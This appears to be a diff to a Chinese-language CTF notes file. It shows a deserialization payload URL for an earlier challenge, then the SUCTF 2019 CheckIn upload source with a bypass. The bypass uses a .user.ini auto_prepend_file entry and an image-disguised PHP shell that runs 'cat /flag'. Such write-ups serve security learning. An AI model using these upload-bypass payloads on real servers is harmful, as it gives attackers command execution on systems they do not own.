@@ -483,4 +483,68 @@ protected改public公有，写入文件名，改成2读取模式，序列化，�
 `3f2919da-a1a0-4b91-b735-34a8e04db922.node4.buuoj.cn:81/?str=O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:8:"flag.php";s:7:"content";N;}
 直接在源码中拿到flag。
 我真想复杂了这题。。。。。。。。
+[SUCTF 2019]CheckIn #文件上传漏洞 
+直接看贴的源码：
+```php
+<!DOCTYPE html>
+<html lang="en">
 
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Upload Labs</title>
+</head>
+
+<body>
+    <h2>Upload Labs</h2>
+    <form action="index.php" method="post" enctype="multipart/form-data">
+        <label for="file">文件名：</label>
+        <input type="file" name="fileUpload" id="file"><br>
+        <input type="submit" name="upload" value="提交">
+    </form>
+</body>
+
+</html>
+
+<?php
+// error_reporting(0);
+$userdir = "uploads/" . md5($_SERVER["REMOTE_ADDR"]);
+if (!file_exists($userdir)) {
+    mkdir($userdir, 0777, true);
+}
+file_put_contents($userdir . "/index.php", "");
+if (isset($_POST["upload"])) {
+    $tmp_name = $_FILES["fileUpload"]["tmp_name"];
+    $name = $_FILES["fileUpload"]["name"];
+    if (!$tmp_name) {
+        die("filesize too big!");
+    }
+    if (!$name) {
+        die("filename cannot be empty!");
+    }
+    $extension = substr($name, strrpos($name, ".") + 1);
+    if (preg_match("/ph|htacess/i", $extension)) {
+        die("illegal suffix!");
+    }
+    if (mb_strpos(file_get_contents($tmp_name), "<?") !== FALSE) {
+        die("&lt;? in contents!");
+    }
+    $image_type = exif_imagetype($tmp_name);
+    if (!$image_type) {
+        die("exif_imagetype:not image!");
+    }
+    $upload_file_path = $userdir . "/" . $name;
+    move_uploaded_file($tmp_name, $upload_file_path);
+    echo "Your dir " . $userdir. ' <br>';
+    echo 'Your files : <br>';
+    var_dump(scandir($userdir));
+}
+```
+过滤了.htaccess,php,phtml后缀的文件，过滤了图片的文件头，过滤了文件中的\<?,且其会自动在用户上传的目录中创建一个空的index.php文件。
+综上几点，使用.user.ini中的auto_prepend_file=与auto_append_file,常用prepend，因为大多数使用了exit()，append在结尾是没用的。
+.user.ini文件马：
+`auto_prepend_file=114514.jpg`
+114514.jpg图片马：
+`<script language='php'>system('cat /flag')</script>`
+这两个马都要加图片的文件头绕过检测。上传两个马，访问上传目录下的index.php拿到flag。
